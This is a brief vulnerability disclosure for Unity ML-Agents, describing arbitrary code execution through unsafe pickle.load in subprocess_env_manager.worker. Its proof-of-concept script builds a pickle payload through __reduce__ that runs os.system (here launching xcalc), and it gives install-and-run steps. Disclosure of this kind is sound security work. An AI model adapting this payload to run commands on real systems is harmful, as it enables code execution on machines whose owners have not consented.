# Description
The Unity Machine Learning Agents Toolkit (ML-Agents) is an open-source project that enables games and simulations to serve as environments for training intelligent agents.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip install mlagents')
from mlagents.trainers import subprocess_env_manager
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
subprocess_env_manager.worker(dumps,dumps,dumps,dumps,dumps)
```
* `pip3 install mlagents`
* `python3 exploit.py`
